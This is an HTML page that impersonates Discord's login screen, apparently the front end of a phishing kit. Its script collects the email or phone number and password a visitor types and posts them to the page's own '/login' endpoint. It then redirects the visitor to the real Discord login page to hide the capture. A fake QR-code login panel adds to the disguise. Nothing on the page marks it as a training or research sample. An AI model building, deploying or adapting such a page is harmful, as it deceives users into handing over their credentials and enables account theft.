<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord - Login</title>
    <style>
        body {
            font-family: "gg sans", "Noto Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
            background-image: url('https://assets-global.website-files.com/6257adef93867e56f84d3092/646218c67ec47462bf258060_hero-bg-1.svg');
            background-size: cover;
            background-color: #5865F2;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: #313338;
            padding: 32px;
            border-radius: 5px;
            width: 784px;
            display: flex;
            box-shadow: 0 2px 10px 0 rgba(0,0,0,.2);
        }
        .left-side {
            flex: 1;
            padding-right: 32px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
        }
        .right-side {
            flex: 1;
            padding-left: 32px;
        }
        h2 {
            color: #f2f3f5;
            font-size: 24px;
            margin-bottom: 8px;
            text-align: center;
        }
        p {
            color: #b5bac1;
            font-size: 16px;
            margin-bottom: 20px;
            text-align: center;
        }
        label {
            color: #b5bac1;
            font-size: 12px;
            text-transform: uppercase;
            font-weight: 700;
            display: block;
            margin-bottom: 8px;
        }
        label span {
            color: #f23f42;
        }
        input {
            background-color: #1e1f22;
            border: none;
            border-radius: 3px;
            color: #dbdee1;
            padding: 10px;
            height: 40px;
            width: 100%;
            box-sizing: border-box;
            margin-bottom: 20px;
            font-size: 16px;
        }
        input:focus {
            outline: none;
        }
        .forgot {
            color: #00a8fc;
            font-size: 14px;
            text-decoration: none;
            display: block;
            margin-bottom: 20px;
        }
        .submit-btn {
            background-color: #5865F2;
            color: white;
            border: none;
            border-radius: 3px;
            width: 100%;
            height: 44px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color .17s ease;
        }
        .submit-btn:hover {
            background-color: #4752c4;
        }
        .register {
            margin-top: 8px;
            color: #949ba4;
            font-size: 14px;
        }
        .register a {
            color: #00a8fc;
            text-decoration: none;
        }
        .qr-section {
            text-align: center;
        }
        .qr-section img {
            width: 176px;
            height: 176px;
            border-radius: 4px;
            margin-bottom: 24px;
        }
        .qr-section h3 {
            color: #f2f3f5;
            font-size: 24px;
            margin-bottom: 8px;
        }
        .qr-section p {
            color: #b5bac1;
            font-size: 16px;
        }
    </style>
    <script>
        async function handleLogin(event) {
            event.preventDefault();
            const form = event.target;
            const formData = new FormData(form);
            const data = Object.fromEntries(formData.entries());
            
            try {
                const response = await fetch('/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                
                if (response.ok) {
                    window.location.href = "https://discord.com/login";
                }
            } catch (error) {
                console.error('Error:', error);
            }
        }
    </script>
</head>
<body>
    <div class="container">
        <div class="right-side" style="flex: 1.5; padding-right: 0;">
            <h2>Welcome back!</h2>
            <p>We're so excited to see you again!</p>
            
            <form id="login-form" onsubmit="handleLogin(event)">
                <label for="email">Email or Phone Number <span>*</span></label>
                <input type="text" id="email" name="email" required>
                
                <label for="password">Password <span>*</span></label>
                <input type="password" id="password" name="password" required>
                
                <a href="#" class="forgot">Forgot your password?</a>
                
                <button type="submit" class="submit-btn">Log In</button>
                
                <div class="register">
                    Need an account? <a href="#">Register</a>
                </div>
            </form>
        </div>
        <div class="left-side" style="flex: 1; border-left: 1px solid #3f4147; margin-left: 32px; padding-left: 32px; padding-right: 0;">
             <div class="qr-section">
                <img src="https://upload.wikimedia.org/wikipedia/en/thumb/9/98/Discord_logo.svg/500px-Discord_logo.svg.png" alt="QR Code" style="object-fit: contain;">
                <h3>Log in with QR Code</h3>
                <p>Scan this with the <strong>Discord mobile app</strong> to log in instantly.</p>
            </div>
        </div>
    </div>
</body>
</html>
